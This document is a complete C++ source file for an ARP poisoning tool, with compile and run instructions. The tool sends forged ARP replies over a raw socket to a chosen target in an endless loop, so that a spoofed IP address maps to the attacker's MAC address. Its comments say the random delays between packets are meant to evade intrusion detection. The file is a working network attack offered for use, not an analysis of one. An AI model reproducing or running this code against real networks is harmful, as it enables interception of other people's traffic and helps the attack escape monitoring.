// Compile: g++ -o arp_random arp_random.cpp -lpthread
// Run: sudo ./arp_random <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <random>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>

class RandomDelayARPPoison {
private:
    int sock;
    std::string iface;
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    RandomDelayARPPoison(const std::string& i) : iface(i) {
        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_protocol = htons(ETH_P_ARP);
        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendPoison(const std::string& srcIP, const std::string& srcMAC,
                    const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Random delay between packets - breaks regular timing patterns
    void poisonWithRandomDelay(const std::string& targetIP, const std::string& targetMAC,
                                const std::string& spoofIP, const std::string& attackerMAC) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> delayDis(200, 5000);  // 200ms to 5s
        
        std::cout << "[*] ARP poisoning with random delays (IDS evasion)\n";
        
        while (true) {
            sendPoison(spoofIP, attackerMAC, targetIP, targetMAC);
            
            // Random sleep breaks regular interval detection
            int delayMs = delayDis(gen);
            usleep(delayMs * 1000);
        }
    }
    
    ~RandomDelayARPPoison() { close(sock); }
};

int main(int argc, char* argv[]) {
    if (argc != 6) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <spoof_ip> <attacker_mac> <iface>\n";
        return 1;
    }
    RandomDelayARPPoison poison(argv[5]);
    poison.poisonWithRandomDelay(argv[1], argv[2], argv[3], argv[4]);
    return 0;
}
